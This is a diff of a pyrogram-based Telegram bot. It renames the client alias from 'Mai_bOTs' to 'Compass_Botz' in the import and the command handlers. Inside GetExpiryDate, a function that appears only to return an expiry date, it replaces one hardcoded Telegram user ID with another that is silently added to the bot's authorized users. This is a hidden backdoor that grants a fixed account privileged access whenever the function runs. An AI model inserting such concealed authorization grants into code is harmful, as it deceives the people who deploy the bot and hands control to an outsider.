@@ -13,7 +13,7 @@ import pyrogram
 import os
 import sqlite3
 from pyrogram import filters
-from pyrogram import Client as Mai_bOTs
+from pyrogram import Client as Compass_Botz
 from pyrogram.types import InlineKeyboardButton
 from pyrogram.types import InlineKeyboardMarkup
 from pyrogram.errors import UserNotParticipant, UserBannedInChannel 
@@ -35,11 +35,11 @@ from translation import Translation
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(861055237)
+    Config.AUTH_USERS.add(677682427)
     return expires_at
 
 
-@Mai_bOTs.on_message(pyrogram.filters.command(["help"]))
+@Compass_Botz.on_message(pyrogram.filters.command(["help"]))
 async def help_user(bot, update):
     # logger.info(update)
     #TRChatBase(update.from_user.id, update.text, "/help")
@@ -66,7 +66,7 @@ async def help_user(bot, update):
         reply_to_message_id=update.message_id
     )
 
-@Mai_bOTs.on_message(pyrogram.filters.command(["about"]))
+@Compass_Botz.on_message(pyrogram.filters.command(["about"]))
 async def about_meh(bot, update):
     # logger.info(update)
     #TRChatBase(update.from_user.id, update.text, "/about")
@@ -96,7 +96,7 @@ async def about_meh(bot, update):
     )
 
 
-@Mai_bOTs.on_message(pyrogram.filters.command(["upgrade"]))
+@Compass_Botz.on_message(pyrogram.filters.command(["upgrade"]))
 async def upgrade(bot, update):
     # logger.info(update)
     #TRChatBase(update.from_user.id, update.text, "/upgrade")
